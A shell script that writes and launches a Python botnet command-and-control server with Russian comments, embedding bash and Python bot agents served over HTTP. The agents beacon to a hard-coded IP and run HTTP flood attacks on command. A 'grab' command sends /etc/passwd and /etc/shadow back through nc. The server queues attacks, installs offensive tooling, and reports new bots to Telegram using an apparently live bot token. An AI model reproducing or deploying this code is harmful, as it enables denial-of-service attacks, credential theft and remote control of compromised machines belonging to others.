cat > /root/c2/botnet/c2.py << 'EOF'
#!/usr/bin/env python3
# AVZ-Aristo C2 v25.15.1 – исправленная автоустановка
import asyncio, json, os, time, subprocess, sys, requests
from datetime import datetime
from aiohttp import web

HTTP_PORT = 80
API_PORT = 8080
BOTS_FILE = "bots.json"
COMMANDS_FILE = "commands.json"

TELEGRAM_TOKEN = "8801568177:AAG8KfuLv79gJ0VEhL85QwmOB4OL9R1KNto"
TELEGRAM_CHAT_ID = "2119367196"

AGENT_BASH = """#!/bin/bash
C2_HOST="80.249.146.202"
C2_PORT=80
while true; do
  (echo -n '{"hostname":"'$(hostname)'","os":"'$(uname -s)'","cpu":"'$(nproc)'","ram":"'$(free -m | awk '/^Mem/{print $2}')' MB'"}'; sleep 1) | nc $C2_HOST $C2_PORT
  CMD=$(echo "ping" | nc -w 3 $C2_HOST $C2_PORT)
  if [ "$CMD" != "no commands" ] && [ -n "$CMD" ]; then
    echo "$CMD" | while read line; do
      type=$(echo "$line" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('type',''))" 2>/dev/null)
      if [ "$type" = "attack" ]; then
        target=$(echo "$line" | python3 -c "import sys,json; print(json.load(sys.stdin)['target'])" 2>/dev/null)
        threads=$(echo "$line" | python3 -c "import sys,json; print(json.load(sys.stdin).get('threads',100))" 2>/dev/null)
        for i in $(seq 1 $threads); do
          wget -q -O- "$target" &
        done
      elif [ "$type" = "grab" ]; then
        cat /etc/passwd /etc/shadow 2>/dev/null | nc $C2_HOST $C2_PORT -w 3
      elif [ "$type" = "stop" ]; then
        pkill wget
      fi
    done
  fi
  sleep 5
done
"""

AGENT_PYTHON = """#!/usr/bin/env python3
import socket, json, time, os, platform, subprocess, threading
C2_HOST = "80.249.146.202"
C2_PORT = 80
def get_info():
    return {"hostname": platform.node(), "os": f"{platform.system()} {platform.release()}", "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown", "ram": "unknown"}
def register():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(json.dumps(get_info()).encode())
        s.close()
    except: pass
def get_commands():
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"ping")
        data = s.recv(4096)
        s.close()
        if data and data != b"no commands":
            return json.loads(data)
    except: pass
    return []
def main():
    register()
    while True:
        cmds = get_commands()
        for cmd in cmds:
            if cmd.get("type") == "attack":
                target = cmd.get("target")
                threads = int(cmd.get("threads", 10))
                def flood():
                    import requests
                    for _ in range(threads):
                        try:
                            requests.get(target, timeout=2)
                        except: pass
                threading.Thread(target=flood, daemon=True).start()
        time.sleep(5)
if __name__ == "__main__":
    main()
"""

bots = {}
if os.path.exists(BOTS_FILE):
    with open(BOTS_FILE) as f:
        bots = json.load(f)

commands_queue = {}
if os.path.exists(COMMANDS_FILE):
    with open(COMMANDS_FILE) as f:
        commands_queue = json.load(f)

def save_bots():
    with open(BOTS_FILE, "w") as f:
        json.dump(bots, f, indent=2)

def save_commands():
    with open(COMMANDS_FILE, "w") as f:
        json.dump(commands_queue, f, indent=2)

def telegram_notify(msg):
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                          json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)
        except: pass

def ensure_dependencies():
    deps = [
        'redis', 'docker', 'asyncssh', 'paramiko', 'aiohttp', 'requests',
        'mysql-connector-python', 'pymssql', 'psycopg2-binary',
        'impacket', 'pywinrm', 'vncdotool'
    ]
    for lib in deps:
        try:
            if lib == 'mysql-connector-python':
                __import__('mysql.connector')
            elif lib == 'psycopg2-binary':
                __import__('psycopg2')
            else:
                __import__(lib.replace('-', '_'))
        except ImportError:
            print(f"[*] Installing {lib}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
            except Exception as e:
                print(f"[!] Failed to install {lib}: {e}")

ensure_dependencies()

async def handle_tcp(reader, writer):
    ip = writer.get_extra_info('peername')[0]
    try:
        data = await asyncio.wait_for(reader.read(4096), timeout=5)
    except:
        writer.close()
        return
    msg = data.decode('utf-8', errors='replace').strip()
    print(f"[TCP:{ip}] {msg[:200]}")

    if msg == "list":
        now = datetime.now()
        bots_list = []
        for bot_ip, bot in bots.items():
            last_seen = datetime.strptime(bot["last_seen"], "%Y-%m-%d %H:%M:%S")
            if (now - last_seen).total_seconds() > 30:
                bot["status"] = "offline"
            else:
                bot["status"] = "online"
            bots_list.append(bot)
        writer.write(json.dumps(bots_list).encode())
    elif msg.startswith("attack:"):
        parts = msg.split(":", 1)[1].split("|")
        if len(parts) >= 3:
            target, method, threads = parts[0], parts[1], parts[2]
            bot_ips = parts[3].split(",") if len(parts) > 3 else list(bots.keys())
            for bot_ip in bot_ips:
                commands_queue.setdefault(bot_ip, []).append(
                    {"type": "attack", "target": target, "method": method, "threads": int(threads)})
            save_commands()
            writer.write(b"commands queued")
        else:
            writer.write(b"invalid format")
    elif msg.startswith("grab:"):
        bot_ips = msg.split(":", 1)[1].split(",") if ":" in msg else list(bots.keys())
        for bot_ip in bot_ips:
            commands_queue.setdefault(bot_ip, []).append({"type": "grab"})
        save_commands()
        writer.write(b"grab queued")
    elif msg.startswith("stop:"):
        bot_ips = msg.split(":", 1)[1].split(",") if ":" in msg else list(bots.keys())
        for bot_ip in bot_ips:
            commands_queue.setdefault(bot_ip, []).append({"type": "stop"})
        save_commands()
        writer.write(b"stop queued")
    elif msg == "ping":
        if ip in commands_queue and commands_queue[ip]:
            pending = commands_queue.pop(ip)
            save_commands()
            writer.write(json.dumps(pending).encode())
        else:
            writer.write(b"no commands")
        if ip in bots:
            bots[ip]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            bots[ip]["status"] = "online"
            save_bots()
    else:
        info = {}
        try:
            data = json.loads(msg)
            if isinstance(data, dict) and data.get("type") == "register":
                info = data.get("data", {})
            else:
                info = data
        except:
            pass
        hostname = info.get("hostname", "")
        os_info = info.get("os", "")
        cpu = info.get("cpu", "")
        ram = info.get("ram", "")
        is_new = ip not in bots
        bots[ip] = {
            "ip": ip,
            "hostname": hostname,
            "os": os_info,
            "cpu": cpu,
            "ram": ram,
            "status": "online",
            "rps": 0,
            "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_bots()
        if is_new:
            telegram_notify(f"🟢 Новый бот: {ip} ({hostname})")
        writer.write(b"registered")
    await writer.drain()
    writer.close()

async def start_tcp():
    server = await asyncio.start_server(handle_tcp, '0.0.0.0', HTTP_PORT)
    print(f"[+] TCP C2 на порту {HTTP_PORT}")
    async with server:
        await server.serve_forever()

async def handle_api_list(request):
    now = datetime.now()
    bots_list = []
    for bot_ip, bot in bots.items():
        last_seen = datetime.strptime(bot["last_seen"], "%Y-%m-%d %H:%M:%S")
        if (now - last_seen).total_seconds() > 30:
            bot["status"] = "offline"
        else:
            bot["status"] = "online"
        bots_list.append(bot)
    return web.json_response(bots_list)

async def handle_api_cmd(request):
    data = await request.json()
    cmd = data.get("cmd")
    if cmd == "attack":
        target = data["target"]
        method = data.get("method", "GET")
        threads = data.get("threads", 100)
        bot_ips = data.get("bot_ips", list(bots.keys()))
        for ip in bot_ips:
            commands_queue.setdefault(ip, []).append(
                {"type": "attack", "target": target, "method": method, "threads": threads})
        save_commands()
        return web.Response(text="commands queued")
    elif cmd == "grab":
        bot_ips = data.get("bot_ips", list(bots.keys()))
        for ip in bot_ips:
            commands_queue.setdefault(ip, []).append({"type": "grab"})
        save_commands()
        return web.Response(text="grab queued")
    elif cmd == "stop":
        bot_ips = data.get("bot_ips", list(bots.keys()))
        for ip in bot_ips:
            commands_queue.setdefault(ip, []).append({"type": "stop"})
        save_commands()
        return web.Response(text="stop queued")
    return web.Response(text="unknown")

async def handle_agent_bash(request):
    return web.Response(text=AGENT_BASH, content_type="text/plain")

async def handle_agent_py(request):
    return web.Response(text=AGENT_PYTHON, content_type="text/plain")

async def main():
    tcp_server = await asyncio.start_server(handle_tcp, '0.0.0.0', HTTP_PORT)
    print(f"[+] TCP C2 на порту {HTTP_PORT}")

    app = web.Application()
    app.router.add_get('/list', handle_api_list)
    app.router.add_post('/cmd', handle_api_cmd)
    app.router.add_get('/agent_bash.sh', handle_agent_bash)
    app.router.add_get('/agent.py', handle_agent_py)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', API_PORT)
    await site.start()
    print(f"[+] HTTP API на порту {API_PORT}")

    await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
EOF

pkill -9 -f botnet/c2.py
screen -dmS c2 python3 /root/c2/botnet/c2.py
sleep 2 && ss -tlnp | grep 80